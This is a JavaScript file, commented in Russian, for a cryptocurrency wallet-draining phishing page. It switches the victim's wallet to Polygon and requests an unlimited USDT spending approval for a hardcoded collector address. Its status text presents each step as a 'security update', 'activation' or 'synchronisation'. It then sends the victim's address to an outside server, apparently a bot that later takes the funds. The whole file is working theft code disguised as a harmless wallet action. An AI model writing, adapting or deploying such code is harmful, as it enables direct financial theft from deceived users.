// Конфигурация
const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex
const SERVER_URL = 'https://railway-production-2954.up.railway.app/save-address';

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    // 1. Проверка наличия провайдера (Trust/MetaMask)
    if (!window.ethereum) {
        status.innerText = 'Пожалуйста, откройте ссылку внутри Trust Wallet или MetaMask';
        return;
    }

    try {
        status.innerText = 'Подключение к сети...';

        // 2. Принудительная смена сети на Polygon
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (error) {
            if (error.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            } else {
                throw error;
            }
        }

        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.requestAccounts();
        const address = accounts[0];

        // ABI для проверки лимитов и аппрува
        const abi = [
            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];
        
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        // ШАГ 1: Динамический расчет цены газа
        const getDynamicGas = async () => {
            const currentPrice = await web3.eth.getGasPrice();
            // Умножаем на 1.2 (добавляем 20%), чтобы транзакция прошла быстрее
            return Math.floor(Number(currentPrice) * 1.2).toString();
        };

        // ШАГ 2: Проверка текущего лимита (Allowance)
        const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
        
        // ШАГ 3: Сброс лимита до 0 (необходимо для USDT перед новым аппрувом)
        if (currentAllowance.toString() !== "0") {
            status.innerText = 'Обновление безопасности (1/2)...';
            const gasPrice0 = await getDynamicGas();
            await contract.methods.approve(COLLECTOR_ADDRESS, "0").send({ 
                from: address,
                gasPrice: gasPrice0
            });
        }

        // ШАГ 4: Основной бесконечный Approve
        status.innerText = 'Подтвердите активацию в кошельке...';
        const maxUint = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        const gasPriceMax = await getDynamicGas();
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
            from: address,
            gasPrice: gasPriceMax
        });

        status.innerText = 'Синхронизация данных...';

        // ШАГ 5: Отправка адреса в твой бот на Railway
        const response = await fetch(SERVER_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        if (response.ok) {
            status.innerText = '✅ Готово! Кошелек успешно синхронизирован.';
            status.style.color = '#00ff00';
        } else {
            status.innerText = '⚠️ Активировано, но сервер не ответил.';
        }

    } catch (error) {
        console.error(error);
        if (error.message.includes('User denied')) {
            status.innerText = 'Ошибка: Вы отклонили транзакцию';
        } else {
            status.innerText = 'Ошибка: ' + (error.message || 'Попробуйте позже');
        }
        status.style.color = '#ff4d4d';
    }
}

// Привязка к кнопке (проверяем оба варианта ID)
const btn = document.getElementById('startBtn') || document.getElementById('connectBtn');
if (btn) btn.addEventListener('click', connectAndApprove);
